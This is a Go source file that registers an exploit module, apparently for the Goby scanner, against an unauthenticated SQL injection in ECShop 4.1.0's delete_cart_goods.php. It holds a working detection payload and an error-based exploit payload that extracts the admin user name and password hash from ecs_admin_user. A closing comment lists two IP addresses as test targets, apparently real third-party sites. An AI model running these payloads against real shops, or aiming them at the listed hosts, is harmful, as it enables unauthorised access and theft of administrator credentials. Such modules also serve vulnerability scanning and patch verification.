package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ecshop 4.1.0 delete_cart_goods.php SQLi",
    "Description": "The front desk is free of login SQL injection vulnerability，Exp returns the CMS user name and password。Note: the last digit of the password is removed，If the exp is not successful, it may be due to a version issue, please test manually",
    "Product": "ecshop",
    "Homepage": "https://www.shopex.cn/",
    "DisclosureDate": "2021-05-24",
    "Author": "theworld",
    "GobyQuery": "product=\"ECShop\"",
    "Level": "2",
    "Impact": "<p>Get database data, and in serious cases get a Webshell</p>",
    "Recommendation": "<p>Use SQL pre-processing operations</p>",
    "References": [
        "https://www.seebug.org/vuldb/ssvid-99060"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/delete_cart_goods.php",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache"
                },
                "data_type": "text",
                "data": "id=1||(updatexml(1,concat(0x7e,(select%20md5(1))),1))"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "~c4ca4238a0b923820dcc509a6f75849",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/delete_cart_goods.php",
                "follow_redirect": false,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache"
                },
                "data_type": "text",
                "data": "id=1||(select 1 from (select count(*),concat(0x7e,(select concat(user_name,0x3a,password) from ecs_admin_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Duplicate entry",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|'~(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6829"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//注释：测试案例：http://47.110.10.196 或http://103.27.209.213/
